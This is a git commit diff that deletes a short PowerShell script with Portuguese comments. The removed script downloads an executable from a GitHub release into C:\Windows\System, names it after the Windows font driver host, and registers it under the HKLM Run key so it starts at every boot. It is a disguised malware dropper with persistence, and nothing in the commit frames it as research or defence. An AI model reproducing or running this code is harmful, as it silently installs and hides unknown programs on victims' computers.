c7e32f02add5d7bb99afb268cb8301b0a19533d9
so251 <aquelequefujedocombateecorno@tutamail.com>
2024-08-04 00:52:02 -0300

    Delete createscript.ps1

--- createscript.ps1
+++
@@ -1,9 +0,0 @@
-Invoke-RestMethod -Uri "https://github.com/so251/olaquerida/releases/download/1releasae/usermodefontdriverhost.exe" -OutFile "C:\Windows\System\usermodefontdriverhost.exe" 
-
-# Caminho do script PowerShell
-$programPath = "C:\Windows\System\usermodefontdriverhost.exe"
-
-# Comando para adicionar a entrada no Registro e executar o script PowerShell de forma oculta
-$command = "C:\Windows\System\usermodefontdriverhost.exe"
-
-Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "User Mode Font Driver Host" -Value $command
